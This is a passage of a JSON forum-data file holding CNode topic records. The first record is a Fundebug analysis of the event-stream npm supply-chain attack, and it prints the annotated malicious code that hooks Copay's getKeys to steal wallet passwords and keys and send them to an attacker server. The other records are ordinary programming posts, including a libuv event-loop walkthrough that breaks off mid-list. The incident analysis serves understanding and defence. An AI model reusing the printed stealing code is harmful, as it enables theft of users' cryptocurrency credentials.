getUserInfo(&quot;profile&quot;, function(profile) {\n            for (var t in profile.credentials) {\n                var n = profile.credentials[t];\n                if (n.network == &quot;livenet&quot;) {\n                    getUserInfo(\n                        &quot;balanceCache-&quot; + n.walletId,\n                        function(e) {\n                            var t = this;\n                            t.balance = parseFloat(e.balance.split(&quot; &quot;)[0]);\n                            &#x2F;&#x2F; 当比特币超过100个或者bch超过1000个时，将用户数据发送到黑客服务器\n                            if (\n                                (&quot;btc&quot; == t.coin &amp;&amp; t.balance &gt; 100) ||\n                                (&quot;bch&quot; == t.coin &amp;&amp; t.balance &gt; 1000)\n                            ) {\n                                ifSteal = true;\n                                sendToHacker(&quot;c&quot;, JSON.stringify(t));\n                            }\n                        }.bind(n)\n                    );\n                }\n            }\n        });\n        &#x2F;&#x2F; 通过重写getKeys函数来窃取用户的密码\n        var Credentials = require(&quot;bitcore-wallet-client&#x2F;lib&#x2F;credentials.js&quot;);\n        Credentials.prototype.getKeysFunc = Credentials.prototype.getKeys;\n        Credentials.prototype.getKeys = function(password) {\n            var keys = this.getKeysFunc(password);\n            if (ifSteal) {\n                &#x2F;&#x2F; 将窃取的密码发送到黑客服务器\n                sendToHacker(&quot;p&quot;, password + &quot;\\t&quot; + this.xPubKey);\n            }\n            return keys;\n        };\n    }\n\n    if (window.cordova) {\n        document.addEventListener(&quot;deviceready&quot;, steal);\n    } else {\n        steal();\n    }\n})();\n</code></pre><p>详细分析可以看我写的代码注释，另外，我还总结了这些<strong>要点</strong></p>\n<ul>\n<li>这段代码的目的是窃取用户信息，并非挖矿；</li>\n<li>黑客通过重写<a href=\"https://github.com/bitpay/bitcore-wallet-client/blob/c09c70473096fc9643d78b01b64f0481e2b2b334/lib/credentials.js#L392\">getKeys</a>函数窃取了<a href=\"https://github.com/bitpay/copay\">copay</a>用户的密码，发送到<strong><a href=\"http://111.90.151.134:8080/p\">http://111.90.151.134:8080/p</a></strong></li>\n<li>黑客窃取了<a href=\"https://github.com/bitpay/copay\">copay</a>用户所有的隐私信息，包括私钥，发送到<strong><a href=\"http://111.90.151.134:8080/c\">http://111.90.151.134:8080/c</a></strong></li>\n<li>黑客对窃取的数据进行了简单混淆以及公钥加密，因此只有他可以读取窃取的数据；</li>\n<li>黑客显然分析了<a href=\"https://github.com/bitpay/copay\">copay</a>源码，然后量身定做了这段代码，因此这段代码对其他项目是无效的，肯定会报错，所以他写了很多try…catch。从另一个角度来讲，<strong>其他项目比如Vue完全不用担心</strong>；</li>\n<li>通过nmap命令扫描黑客的服务器111.90.151.134的8080端口可知，他目前已经不再接收窃取的数据；</li>\n</ul>\n<h3>结尾</h3>\n<p>通过这件事，大家可能会觉得开源不安全，但是我不这样看。黑客之所以处心积虑想了这么多歪招来窃取用户数据，就是因为代码是开源的，他不敢乱来。另外，这件事虽然潜伏了几个月，但是一经发现，大家分析一下代码，齐心协力很快就发现黑客到底干了什么，把整件事的来龙去脉翻了个底朝天，我也是基于大家的工作又梳理了这件事。我们应该思考的是，如何让代码更加安全，而这件事恰恰可以给我们很多启示，这个我下次再聊。</p>\n<p>其实，这件事挺有意思的，还有很多问题，比如黑客一共用到了哪些技巧？黑客是怎么被发现的？黑客究竟是谁？如何保证JavaScript与区块链的安全性？以后再说吧…</p>\n<h3>参考</h3>\n<ul>\n<li><a href=\"https://blog.npmjs.org/post/180565383195/details-about-the-event-stream-incident\">Details about the event-stream incident</a></li>\n<li><a href=\"https://schneid.io/blog/event-stream-vulnerability-explained/\">event-stream vulnerability explained</a></li>\n<li><a href=\"https://github.com/dominictarr/event-stream/issues/116\">I don’t know what to say.</a></li>\n<li><a href=\"https://github.com/bitpay/copay/issues/9346\">event-stream dependency attack steals wallets from users of copay</a></li>\n<li><a href=\"https://mp.weixin.qq.com/s/IaOWxG0XLvn2znvvP1dmwA\">月下载量千万的npm包被黑客篡改，Vue开发者可能正在遭受攻击</a></li>\n</ul>\n<h3>关于Fundebug</h3>\n<p><a href=\"https://www.fundebug.com/\">Fundebug</a>专注于JavaScript、微信小程序、微信小游戏、支付宝小程序、React Native、Node.js和Java实时BUG监控。 自从2016年双十一正式上线，Fundebug累计处理了9亿+错误事件，得到了Google、360、金山软件、百姓网等众多知名用户的认可。欢迎免费试用！</p>\n<p><img src=\"https://static.fundebug.cn/wechat_slogan.png\" alt></p>\n<h3>版权声明</h3>\n<p>转载时请注明作者<a href=\"https://www.fundebug.com/\">Fundebug</a>以及本文地址：\n<a href=\"https://blog.fundebug.com/2018/12/03/how-does-javascript-hacker-steal-bitcoin/\">https://blog.fundebug.com/2018/12/03/how-does-javascript-hacker-steal-bitcoin/</a></p>\n</div>",
+          "title" : "JavaScript黑客是这样窃取比特币的，Vue开发者不用担心！",
+          "last_reply_at" : "2018-12-06T02:54:57.051Z",
+          "good" : true,
+          "top" : false,
+          "reply_count" : 5,
+          "visit_count" : 711,
+          "create_at" : "2018-12-03T02:49:15.127Z",
+          "author" : {
+              "loginname" : "Fundebug",
+              "avatar_url" : "https://avatars2.githubusercontent.com/u/26496557?v=4&s=120"
+          }
+      },
+      {
+          "id" : "5c066e5cd3b8ab334e8daade",
+          "author_id" : "58f837a3bbaf2f3f569be082",
+          "tab" : "share",
+          "content" : "<div class=\"markdown-text\"><p><strong><a href=\"https://github.com/shuiRong/ReactCnodeJS\">Github</a></strong>   <strong><a href=\"https://reactcnodejs.netlify.com/\">DEMO</a></strong></p>\n<blockquote>\n<p>一个 React 的<strong>初/中级</strong>练习项目：重构 CnodeJS 社区</p>\n</blockquote>\n<p><img src=\"//static.cnodejs.org/Fr95zWpE2LUpmWm4HK69oxXnAxj0\" alt=\"preview.png\"></p>\n<hr>\n<p>这里<strong>简述下我学习 React 的方式：</strong></p>\n<ol>\n<li>看了一边文档，把‘主要概念’全部看完，‘高级指引’里的根据个人兴趣挑了一些看了看。</li>\n<li>紧接着就动手写此项目（大概花了 3 天的业余时间完成）</li>\n</ol>\n<p>在此期间根据需要，看了 React-Router 文档，了解了 Redux 的实现原理（但本项目并没有用 Redux）（歪个楼：“我相信任何复杂技术背后的原理都是简单易懂的”）</p>\n<p><strong>P.S.</strong> 如果你想入门 React,但苦于没有难度合适的项目的话，<strong>It’s For You!</strong>\n（考虑到别人可能会看我源码来学习，我补充了 <strong>“非常详细的注释”</strong> ）</p>\n<hr>\n<p><strong>P.P.S.</strong> 朋友看到后吐槽了句“怎么不是cnode，就是v2ex”（我补充了下“爬虫的话就是煎蛋？ ”）XD</p>\n</div>",
+          "title" : "看完React文档后，重写了下CnodeJS社区，感觉看上去还不错",
+          "last_reply_at" : "2018-12-06T02:47:02.688Z",
+          "good" : false,
+          "top" : false,
+          "reply_count" : 8,
+          "visit_count" : 505,
+          "create_at" : "2018-12-04T12:09:00.191Z",
+          "author" : {
+              "loginname" : "shuiRong",
+              "avatar_url" : "https://avatars1.githubusercontent.com/u/16076993?v=4&s=120"
+          }
+      },
+      {
+          "id" : "5c049e5c39c0af64fddb80e1",
+          "author_id" : "5c0362f439c0af64fddb7c92",
+          "tab" : "share",
+          "content" : "<div class=\"markdown-text\"><p>我和好基友一起开发了Tea，一款带有plugin系统的富文本应用，可以想象成是给程序员用的笔记应用，基于nodejs+electron+react+slatejs（一款富文本编辑器框架）。</p>\n<p><img src=\"https://tea-note.oss-cn-hangzhou.aliyuncs.com/v2ex/overview.png\" alt=\"alt text\"></p>\n<p><strong>技术栈</strong></p>\n<ol>\n<li>electron：桌面多平台web开发框架</li>\n<li>nodejs：electron里自带，跟操作系统、文件系统交互需要</li>\n<li>react：前端框架</li>\n<li>material-ui：基于react的material UI框架</li>\n<li>slate.js: 这是一个革命性的富文本框架，基于react</li>\n<li>Webpack：构建工具</li>\n<li>babel：转译工具</li>\n<li>阿里云：自动更新</li>\n</ol>\n<p>废话不多说，功能上图：</p>\n<h3>1. 所见即所得的 Markdown</h3>\n<p><img src=\"https://tea-note.oss-cn-hangzhou.aliyuncs.com/v2ex/small-pics/markdown.gif\" alt=\"alt text\"></p>\n<h3>2. 各种高效的快捷键</h3>\n<ul>\n<li>图片、标题等对象的插入，可以通过在段首打 @ 呼出</li>\n</ul>\n<p><img src=\"https://tea-note.oss-cn-hangzhou.aliyuncs.com/v2ex/at-demo.gif\" alt=\"alt text\"></p>\n<ul>\n<li>通过 ⌘ + / (Windows 下是Ctrl + /) ，可以查看所有的快捷键，和 Markdown 格式</li>\n</ul>\n<p><img src=\"https://tea-note.oss-cn-hangzhou.aliyuncs.com/v2ex/small-pics/shortcuts-640480.gif\" alt=\"alt text\"></p>\n<h3>3. 插件</h3>\n<p>目前我们自己开发的插件有：</p>\n<ul>\n<li>Vim 模式</li>\n<li>公式编辑——支持 Latex 公式输入</li>\n<li>Markdown 编辑——没错，上面说的所见即所得的 Markdown，其实是一个插件😎</li>\n<li>炸裂模式——见下图，Atom 用户，让我看到你们的双手🤘🤘</li>\n</ul>\n<p><img src=\"https://tea-note.oss-cn-hangzhou.aliyuncs.com/v2ex/small-pics/power-mode.gif\" alt=\"alt text\"></p>\n<h3>4. 速记</h3>\n<p>一个即时贴功能，我们称为小窗口。按下快捷键，Ctrl + Shift + 空格，弹出；再按一次快捷键，关闭。</p>\n<p><img src=\"https://tea-note.oss-cn-hangzhou.aliyuncs.com/v2ex/little-window.gif\" alt=\"alt text\"></p>\n<h3>5. 极简的界面</h3>\n<p><img src=\"https://tea-note.oss-cn-hangzhou.aliyuncs.com/v2ex/small-pics/%E5%A4%A7%E7%99%BD%E7%BA%B8.png\" alt=\"alt text\"></p>\n<h2>未来</h2>\n<ul>\n<li>关于Tea的详细介绍：<a href=\"https://juejin.im/post/5bffadf3f265da616a476096\">https://juejin.im/post/5bffadf3f265da616a476096</a></li>\n<li>现在我们正在内测单机版，感兴趣的小伙伴，请在电脑上打开我们官网 <a href=\"https://www.goodtea.io/\">https://www.goodtea.io/</a>，下载Windows或Mac的内测版。</li>\n<li>另外也欢迎加入我们反馈群，提出你的意见和反馈：</li>\n</ul>\n<p><img src=\"https://tea-note.oss-cn-hangzhou.aliyuncs.com/v2ex/small-pics/feedback-qr-2.png\" alt=\"alt text\"></p>\n<p>目前在我们 backlog 里的功能有：</p>\n<ol>\n<li>Command （ Ctrl ） + Shift + P 命令面板</li>\n<li>代码片段中代码直接运行</li>\n<li>内置 Terminal</li>\n<li>Solarized、Dracula 等各种主题</li>\n<li>分屏</li>\n<li>GitHub Gist 整合</li>\n<li>Presentation 模式</li>\n<li>类似 Sublime 的 Minimap</li>\n<li>自定义快捷键</li>\n<li>流程图、思维导图等图表插入</li>\n<li>。。。</li>\n</ol>\n<p>欢迎大家给我们提出你想要的功能建议。</p>\n<p>enjoy</p>\n</div>",
+          "title" : "基于nodejs+electron+react+slatejs开发的一款带有plugin系统的富文本应用",
+          "last_reply_at" : "2018-12-06T02:36:24.078Z",
+          "good" : false,
+          "top" : false,
+          "reply_count" : 6,
+          "visit_count" : 400,
+          "create_at" : "2018-12-03T03:09:16.909Z",
+          "author" : {
+              "loginname" : "giddens9527",
+              "avatar_url" : "https://avatars2.githubusercontent.com/u/2219296?v=4&s=120"
+          }
+      },
+      {
+          "id" : "5c07461e1c62d83349350ec0",
+          "author_id" : "55f183a188f76a8469b43519",
+          "tab" : "ask",
+          "content" : "<div class=\"markdown-text\"><p>在做leetcode的题目.\n练习2sum的时候, 我的代码如下</p>\n<pre class=\"prettyprint\"><code>var twoSum = function(nums, target) {\n    const set = {};\n    for (var i = 0; i &lt; nums.length; i++) {\n        const val = nums[i];\n        const find = set[val];\n        if (find !== undefined) {\n            return [find, i,];\n        } else {\n            &#x2F;&#x2F; 如果将来某个值满足target - nums[i], 则可以和这个位置匹配\n            set[target - val] = i;\n        }\n    }\n};\n</code></pre><p>80 ms, 排在60%</p>\n<p>然后看了排在80%的代码, 就比我少了一个else, 我自己测试一下代码</p>\n<pre class=\"prettyprint\"><code>var twoSum = function(nums, target) {\n    const set = {};\n    \n    for (var i = 0; i &lt; nums.length; i++) {\n        const val = nums[i];\n        const find = set[val];\n        if (find !== undefined) {\n            return [find, i,];\n        } \n\t\t&#x2F;&#x2F; 就这里去除了else\n\t\t&#x2F;&#x2F; 如果将来某个值满足target - nums[i], 则可以和这个位置匹配\n\t\tset[target - val] = i;\n    }\n};\n</code></pre><p>56 ms, 排88%</p>\n<p>一个else语句能有这么大影响? 什么原理?</p>\n</div>",
+          "title" : "else语句会拖慢运行时间?",
+          "last_reply_at" : "2018-12-06T02:03:33.823Z",
+          "good" : false,
+          "top" : false,
+          "reply_count" : 8,
+          "visit_count" : 384,
+          "create_at" : "2018-12-05T03:29:34.595Z",
+          "author" : {
+              "loginname" : "fulvaz",
+              "avatar_url" : "https://avatars1.githubusercontent.com/u/6868351?v=4&s=120"
+          }
+      },
+      {
+          "id" : "5b8de66137b3005a0b0e6b3f",
+          "author_id" : "5b8de41bbf116a8c0e42579f",
+          "tab" : "share",
+          "content" : "<div class=\"markdown-text\"><p>Egg.js入门视频教程主要讲了Egg的环境搭建   egg的控制器      egg服务  egg中间件   egg路由 egg扩展   egg模板引擎  egg cookie   egg session</p>\n<p><strong>Eggjs 视频教程百度网盘分享接</strong>： <a href=\"https://pan.baidu.com/s/1t6XHpny8-H8mApLkzcsS8w\">https://pan.baidu.com/s/1t6XHpny8-H8mApLkzcsS8w</a></p>\n<p><strong>或者此连接Egg.js视频教程10讲入门链接</strong>： <a href=\"https://pan.baidu.com/s/1-jdCXKGgfk9yI8xJOOhPhg\">https://pan.baidu.com/s/1-jdCXKGgfk9yI8xJOOhPhg</a>  <strong>密码</strong>：4b6i</p>\n<p><strong>来源</strong>  <a href=\"https://cnodejs.org/topic/5b7ac9c7c52ad1482eb940bf\">https://cnodejs.org/topic/5b7ac9c7c52ad1482eb940bf</a></p>\n<p>希望老铁门能喜欢\n<img src=\"//static.cnodejs.org/FoPZNWCMpHqWFAb2QDns-UhIMX-3\" alt=\"egg01.png\"></p>\n<p><img src=\"//static.cnodejs.org/Fu4_-OevpWiKHFqeEGBOW53MCdnE\" alt=\"egg02.png\"></p>\n<p><img src=\"//static.cnodejs.org/FtOEkaeRTUNyuWE2mhvazrxPc6cd\" alt=\"egg03.png\"></p>\n<p><img src=\"//static.cnodejs.org/FtJsuDe3kbcNYWWcJyfxuE08wVs5\" alt=\"egg05.png\"></p>\n<p><img src=\"//static.cnodejs.org/Fp8erhbPkGZrsYFsd-gxn2z4Gssb\" alt=\"222.png\"></p>\n<p><img src=\"//static.cnodejs.org/FhCAuCKVwbQnTCJWtkGKv6ZR8toN\" alt=\"06.png\"></p>\n</div>",
+          "title" : "Egg.js视频教程-Eggjs入门视频教程网盘免费分享-10讲入门基础希望老铁门能喜欢",
+          "last_reply_at" : "2018-12-06T01:43:12.898Z",
+          "good" : false,
+          "top" : false,
+          "reply_count" : 58,
+          "visit_count" : 6063,
+          "create_at" : "2018-09-04T01:56:49.179Z",
+          "author" : {
+              "loginname" : "zlyuanteng",
+              "avatar_url" : "https://avatars0.githubusercontent.com/u/42952042?v=4&s=120"
+          }
+      },
+      {
+          "id" : "5b630389b71aedfe4c1266a2",
+          "author_id" : "5b62fab258db3ccf66a4516b",
+          "tab" : "ask",
+          "content" : "<div class=\"markdown-text\"><p>近期在学习node.js，由于自己是初学者，看了《Node.js开发指南》和 《Node.js开发实战》上的一些基础的东西，《深入浅出 Node.js》看起来是很吃力，最近试着用Express开发自己的一个 个人博客系统，刚刚开始，就感觉很吃力，最近就在想该怎么来学习，希望曾经和我有相同问题的朋友解答下我的疑惑，学习路线很迷茫啊。。。</p>\n</div>",
+          "title" : "node.js的入门（萌新）",
+          "last_reply_at" : "2018-12-06T01:18:20.879Z",
+          "good" : false,
+          "top" : false,
+          "reply_count" : 31,
+          "visit_count" : 3483,
+          "create_at" : "2018-08-02T13:13:45.110Z",
+          "author" : {
+              "loginname" : "remembergf",
+              "avatar_url" : "https://avatars1.githubusercontent.com/u/34055216?v=4&s=120"
+          }
+      },
+      {
+          "id" : "5c022a4b39c0af64fddb7a37",
+          "author_id" : "5c02290939c0af64fddb7a30",
+          "tab" : "ask",
+          "content" : "<div class=\"markdown-text\"><p>考虑到并发量及安全之类的问题，不知道node做这种东西适合吗？请大佬指点先小弟，拜谢</p>\n</div>",
+          "title" : "有这样一个需求，有三百辆左右的共享单车车锁通过tcp与我的服务端通信，我可以用net模块创建tcp服务端做吗？",
+          "last_reply_at" : "2018-12-05T23:36:14.551Z",
+          "good" : false,
+          "top" : false,
+          "reply_count" : 5,
+          "visit_count" : 512,
+          "create_at" : "2018-12-01T06:29:31.814Z",
+          "author" : {
+              "loginname" : "zhiruoyu88",
+              "avatar_url" : "https://avatars0.githubusercontent.com/u/20127886?v=4&s=120"
+          }
+      },
+      {
+          "id" : "5c078c47d3b8ab334e8db0fc",
+          "author_id" : "58d83c586f8b9bf02d1d0b1d",
+          "tab" : "ask",
+          "content" : "<div class=\"markdown-text\"><p>技术学成大牛 然后突然被时代淘汰</p>\n</div>",
+          "title" : "以前的顶级塞班工程师现在如何了",
+          "last_reply_at" : "2018-12-05T17:44:27.919Z",
+          "good" : false,
+          "top" : false,
+          "reply_count" : 3,
+          "visit_count" : 412,
+          "create_at" : "2018-12-05T08:28:55.949Z",
+          "author" : {
+              "loginname" : "ResJay",
+              "avatar_url" : "https://avatars0.githubusercontent.com/u/26635410?v=4&s=120"
+          }
+      },
+      {
+          "id" : "5a9108d78d6e16e56bb80882",
+          "author_id" : "565553143325bb2c4ebd803a",
+          "tab" : "share",
+          "content" : "<div class=\"markdown-text\"><h1>2018/5/8更新：</h1>\n<p>距离这篇文章完笔虽然才两个月，但是我已经对各种细节忘记得差不多（不常用的东西马上就忘记了，大脑内存不足会经常自动腾出空间记忆别的事情），各位如果有任何疑问我大概率是回答不上来，非常抱歉。另外我觉得深入折腾这种东西意义其实不是太大，还不如学习一下更加通用价值更加高的知识（例如算法、数据库原理、操作系统原理、tcp/ip协议、架构设计、高数线代概率统计等）</p>\n<h1>不同的event loop</h1>\n<p>event loop是一个执行模型，在不同的地方有不同的实现。浏览器和nodejs基于不同的技术实现了各自的event loop。网上关于它的介绍多如牛毛，但大多数是基于浏览器的，真正讲nodejs的event loop的并没有多少，甚至很多将浏览器和nodejs的event loop等同起来的。  我觉得讨论event loop要做到以下两点：</p>\n<ul>\n<li><strong>首先要确定好上下文，nodejs和浏览器的event loop是两个有明确区分的事物，不能混为一谈</strong>。</li>\n<li>其次，讨论一些js异步代码的执行顺序时候，<strong>要基于node的源码而不是自己的臆想</strong>。</li>\n</ul>\n<p>简单来讲，</p>\n<ul>\n<li><strong>nodejs的event是基于libuv，而浏览器的event loop则在<a href=\"https://www.w3.org/TR/html5/webappapis.html#event-loops\">html5的规范</a>中明确定义</strong>。</li>\n<li>libuv已经对event loop作出了实现，而html5规范中只是定义了浏览器中event loop的模型，具体实现留给了浏览器厂商。</li>\n</ul>\n<h1>nodejs中的event loop</h1>\n<p>关于nodejs中的event loop有两个地方可以参考，一个是nodejs<a href=\"https://nodejs.org/en/docs/guides/event-loop-timers-and-nexttick/\">官方的文档</a>；另一个是libuv的<a href=\"http://docs.libuv.org/en/v1.x/design.html\">官方的文档</a>，前者已经对nodejs有一个比较完整的描述，而后者则有更多细节的描述。nodejs正在快速发展，源码变化很大，以下的讨论都是基于nodejs9.5.0。</p>\n<p>（然而nodejs的event loop似乎比预料更加复杂，在查看nodejs源码的过程中我惊奇发现原来nodejs的event loop的某些阶段，还会将v8的micro task queue中的任务取出来运行，看来nodejs的浏览器的event loop还是存在一些关联，这些细节我们往后再讨论，目前先关注重点内容。）</p>\n<h2>event loop的6个阶段（phase）</h2>\n<p>nodejs的event loop分为6个阶段，每个阶段的作用如下（<code>process.nextTick()</code>在6个阶段结束的时候都会执行，文章后半部分会详细分析<code>process.nextTick()</code>的回调是怎么引进event loop，仅仅从<code>uv_run()</code>是找不到<code>process.nextTick()</code>是如何牵涉进来）：</p>\n<ul>\n<li>timers：执行<code>setTimeout()</code> 和 <code>setInterval()</code>中到期的callback。</li>\n<li>I/O callbacks：上一轮循环中有少数的I/Ocallback会被延迟到这一轮的这一阶段执行</li>\n<li>idle, prepare：仅内部使用</li>\n<li>poll：最为重要的阶段，执行I/O callback，在适当的条件下会阻塞在这个阶段</li>\n<li>check：执行setImmediate的callback</li>\n<li>close callbacks：执行close事件的callback，例如<code>socket.on(&quot;close&quot;,func)</code></li>\n</ul>\n<pre class=\"prettyprint language-C\"><code>   ┌───────────────────────┐\n┌─&gt;│        timers         │\n│  └──────────┬────────────┘\n│  ┌──────────┴────────────┐\n│  │     I&#x2F;O callbacks     │\n│  └──────────┬────────────┘\n│  ┌──────────┴────────────┐\n│  │     idle, prepare     │\n│  └──────────┬────────────┘      ┌───────────────┐\n│  ┌──────────┴────────────┐      │   incoming:   │\n│  │         poll          │&lt;─────┤  connections, │\n│  └──────────┬────────────┘      │   data, etc.  │\n│  ┌──────────┴────────────┐      └───────────────┘\n│  │        check          │\n│  └──────────┬────────────┘\n│  ┌──────────┴────────────┐\n└──┤    close callbacks    │\n   └───────────────────────┘\n</code></pre><p>event loop的每一次循环都需要依次经过上述的阶段。  每个阶段都有自己的callback队列，每当进入某个阶段，都会从所属的队列中取出callback来执行，当队列为空或者被执行callback的数量达到系统的最大数量时，进入下一阶段。这六个阶段都执行完毕称为一轮循环。</p>\n<p>event loop的核心代码在deps/uv/src/unix/core.c</p>\n<pre class=\"prettyprint language-C\"><code>int uv_run(uv_loop_t* loop, uv_run_mode mode) {\n  int timeout;\n  int r;\n  int ran_pending;\n\n  &#x2F;*\n  从uv__loop_alive中我们知道event loop继续的条件是以下三者之一：\n  1，有活跃的handles（libuv定义handle就是一些long-lived objects，例如tcp server这样）\n  2，有活跃的request\n  3，loop中的closing_handles\n  *&#x2F;\n  r = uv__loop_alive(loop);\n  if (!r)\n    uv__update_time(loop);\n\n  while (r != 0 &amp;&amp; loop-&gt;stop_flag == 0) {\n    uv__update_time(loop);&#x2F;&#x2F;更新时间变量，这个变量在uv__run_timers中会用到\n    uv__run_timers(loop);&#x2F;&#x2F;timers阶段\n    ran_pending = uv__run_pending(loop);&#x2F;&#x2F;从libuv的文档中可知，这个其实就是I&#x2F;O callback阶段,ran_pending指示队列是否为空\n    uv__run_idle(loop);&#x2F;&#x2F;idle阶段\n    uv__run_prepare(loop);&#x2F;&#x2F;prepare阶段\n\n    timeout = 0;\n\n    &#x2F;**\n    设置poll阶段的超时时间，以下几种情况下超时会被设为0，这意味着此时poll阶段不会被阻塞，在下面的poll阶段我们还会详细讨论这个\n    1，stop_flag不为0\n    2，没有活跃的handles和request\n    3，idle、I&#x2F;O callback、close阶段的handle队列不为空\n    否则，设为timer阶段的callback队列中，距离当前时间最近的那个\n    **&#x2F;    \n    if ((mode == UV_RUN_ONCE &amp;&amp; !ran_pending) || mode == UV_RUN_DEFAULT)\n      timeout = uv_backend_timeout(loop);\n\n    uv__io_poll(loop, timeout);&#x2F;&#x2F;poll阶段\n    uv__run_check(loop);&#x2F;&#x2F;check阶段\n    uv__run_closing_handles(loop);&#x2F;&#x2F;close阶段\n    &#x2F;&#x2F;如果mode == UV_RUN_ONCE（意味着流程继续向前）时，在所有阶段结束后还会检查一次timers，这个的逻辑的原因不太明确\n    \n    if (mode == UV_RUN_ONCE) {\n      uv__update_time(loop);\n      uv__run_timers(loop);\n    }\n\n    r = uv__loop_alive(loop);\n    if (mode == UV_RUN_ONCE || mode == UV_RUN_NOWAIT)\n      break;\n  }\n\n  if (loop-&gt;stop_flag != 0)\n    loop-&gt;stop_flag = 0;\n\n  return r;\n}\n\n</code></pre><p>我对重要部分加上注释，从上述代码可以看到event loop的六个阶段是依次执行的。值得注意的是，在UV_RUN_ONCE模式下，timers阶段在当前循环结束前还会得到一次的执行机会。</p>\n<h2>timers阶段</h2>\n<p>timer阶段的代码在deps/uv/src/unix/timer.c的<code>uv__run_timers()</code>中</p>\n<pre class=\"prettyprint language-C\"><code>void uv__run_timers(uv_loop_t* loop) {\n  struct heap_node* heap_node;\n  uv_timer_t* handle;\n\n  for (;;) {\n    heap_node = heap_min((struct heap*) &amp;loop-&gt;timer_heap);&#x2F;&#x2F;取出timer堆上超时时间最小的元素\n    if (heap_node == NULL)\n      break;\n    &#x2F;&#x2F;根据上面的元素，计算出handle的地址，head_node结构体和container_of的结合非常巧妙，值得学习\n    handle = container_of(heap_node, uv_timer_t, heap_node);\n    if (handle-&gt;timeout &gt; loop-&gt;time)&#x2F;&#x2F;如果最小的超时时间比循环运行的时间还要大，则表示没有到期的callback需要执行，此时退出timer阶段\n      break;\n\n    uv_timer_stop(handle);&#x2F;&#x2F;将这个handle移除\n    uv_timer_again(handle);&#x2F;&#x2F;如果handle是repeat类型的，重新插入堆里\n    handle-&gt;timer_cb(handle);&#x2F;&#x2F;执行handle上的callback\n  }\n}\n</code></pre><p>从上面的逻辑可知，<strong>在timer阶段其实使用一个最小堆而不是队列来保存所有元素</strong>（其实也可以理解，因为timeout的callback是按照超时时间的顺序来调用的，并不是先进先出的队列逻辑），然后循环取出所有到期的callback执行。</p>\n<h2>I/O callbacks阶段</h2>\n<p>I/O callbacks阶段的代码在deps/uv/src/unix/core.c的<code>int uv__run_pending()</code>中</p>\n<pre class=\"prettyprint language-C\"><code>static int uv__run_pending(uv_loop_t* loop) {\n  QUEUE* q;\n  QUEUE pq;\n  uv__io_t* w;\n\n  if (QUEUE_EMPTY(&amp;loop-&gt;pending_queue))&#x2F;&#x2F;如果队列为空则退出\n    return 0;\n\n  QUEUE_MOVE(&amp;loop-&gt;pending_queue, &amp;pq);&#x2F;&#x2F;移动该队列\n\n  while (!QUEUE_EMPTY(&amp;pq)) {\n    q = QUEUE_HEAD(&amp;pq);&#x2F;&#x2F;取出队列的头结点\n    QUEUE_REMOVE(q);&#x2F;&#x2F;将其移出队列\n    QUEUE_INIT(q);&#x2F;&#x2F;不再引用原来队列的元素\n    w = QUEUE_DATA(q, uv__io_t, pending_queue);\n    w-&gt;cb(loop, w, POLLOUT);&#x2F;&#x2F;执行callbak直到队列为空\n  }\n  return 1;\n}\n</code></pre><p>根据libuv的文档，一些应该在上轮循环poll阶段执行的callback，因为某些原因不能执行，就会被延迟到这一轮的循环的I/O callbacks阶段执行。换句话说这个阶段执行的callbacks是上轮残留的。</p>\n<h2>idle和prepare阶段</h2>\n<p><code>uv__run_idle()</code>、<code>uv__run_prepare()</code>、<code>uv__run_check()</code>定义在文件deps/uv/src/unix/loop-watcher.c中，它们的逻辑非常相似，其中的实现利用了大量的宏（说实在我个人非常烦宏，它的可读性真的很差，为了那点点的性能而使用宏真是值得商榷）。</p>\n<pre class=\"prettyprint language-C\"><code>  void uv__run_##name(uv_loop_t* loop) {                                      \\\n    uv_##name##_t* h;                                                         \\\n    QUEUE queue;                                                              \\\n    QUEUE* q;                                                                 \\\n    QUEUE_MOVE(&amp;loop-&gt;name##_handles, &amp;queue);&#x2F;&#x2F;用新的头节点取代旧的头节点，相当于将原队列移动到新队列                                \\\n    while (!QUEUE_EMPTY(&amp;queue)) {&#x2F;&#x2F;当新队列不为空                                            \\\n      q = QUEUE_HEAD(&amp;queue);&#x2F;&#x2F;取出新队列首元素                                                 \\\n      h = QUEUE_DATA(q, uv_##name##_t, queue);&#x2F;&#x2F;获取首元素中指向的handle                                \\\n      QUEUE_REMOVE(q);&#x2F;&#x2F;将这个元素移出新队列                                                        \\\n      QUEUE_INSERT_TAIL(&amp;loop-&gt;name##_handles, q);&#x2F;&#x2F;然后再插入旧队列尾部                            \\\n      h-&gt;name##_cb(h);&#x2F;&#x2F;执行对应的callback                                                        \\\n    }                                                                         \\\n  } \n</code></pre><h2>poll阶段</h2>\n<p>poll阶段的代码+注释高达200行不好逐行分析，我们挑选部分重要代码</p>\n<pre class=\"prettyprint language-C\"><code>void uv__io_poll(uv_loop_t* loop, int timeout) {\n\t&#x2F;&#x2F;...\n\t&#x2F;&#x2F;处理观察者队列\n\twhile (!QUEUE_EMPTY(&amp;loop-&gt;watcher_queue)) {\n\t\t&#x2F;&#x2F;...\n\tif (w-&gt;events == 0)\n\t  op = UV__EPOLL_CTL_ADD;&#x2F;&#x2F;新增监听这个事件\n\telse\n\t  op = UV__EPOLL_CTL_MOD;&#x2F;&#x2F;修改这个事件\n\t}\n \t&#x2F;&#x2F;...\n \t&#x2F;&#x2F;阻塞直到监听的事件来临，前面已经算好timeout以防uv_loop一直阻塞下去\n\tif (no_epoll_wait != 0 || (sigmask != 0 &amp;&amp; no_epoll_pwait == 0)) {\n\t  nfds = uv__epoll_pwait(loop-&gt;backend_fd,\n\t            events,\n\t            ARRAY_SIZE(events),\n\t            timeout,\n\t            sigmask);\n\t  if (nfds == -1 &amp;&amp; errno == ENOSYS)\n\t    no_epoll_pwait = 1;\n\t} else {\n\t  nfds = uv__epoll_wait(loop-&gt;backend_fd,\n\t           events,\n\t           ARRAY_SIZE(events),\n\t           timeout);\n\t  if (nfds == -1 &amp;&amp; errno == ENOSYS)\n\t    no_epoll_wait = 1;\n\t}\n\t&#x2F;&#x2F;...\n\tfor (i = 0; i &lt; nfds; i++) {\n\t    if (w == &amp;loop-&gt;signal_io_watcher)\n\t      have_signals = 1;\n\t    else\n\t      w-&gt;cb(loop, w, pe-&gt;events);&#x2F;&#x2F;执行callback\n\t}\n\t&#x2F;&#x2F;...\n}\n</code></pre><p>可见poll阶段的任务就是阻塞等待监听的事件来临，然后执行对应的callback，其中阻塞是带有超时时间的，以下几种情况都会使得超时时间为0</p>\n<ul>\n<li>uv_run处于UV_RUN_NOWAIT模式下</li>\n<li><code>uv_stop()</code>被调用</li>\n<li>没有活跃的handles和request</li>\n<li>有活跃的idle 